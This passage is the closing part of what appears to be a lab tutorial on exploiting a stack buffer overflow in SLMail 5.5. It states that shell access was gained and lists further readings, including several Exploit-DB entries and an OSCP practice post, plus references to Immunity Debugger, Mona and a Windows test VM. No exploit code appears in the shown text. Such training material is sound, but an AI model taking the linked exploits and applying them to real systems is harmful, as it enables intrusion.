Shell access has been gained.

![Foo](/images/buffer/A48C4AC1625F14DD1805917EB1A853BD.jpg)

***

### Additional readings

1\. <https://www.exploit-db.com/exploits/638>

2\. <https://www.hugohirsh.com/?p=509>

3\. <https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/>

4\. <https://www.exploit-db.com/exploits/646/>

5\. <https://www.exploit-db.com/exploits/17546/>

6\. <https://www.exploit-db.com/exploits/636/>

***

### References:


[^3]: SLMail 5.5 - <https://slmail.software.informer.com/5.5/>

[^4]: Immunity Debugger - <https://www.immunityinc.com/products/debugger/>

[^1]: IE8 on Win7 (x86) virtual machine - <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/>

[^2]: Mona - <https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/>


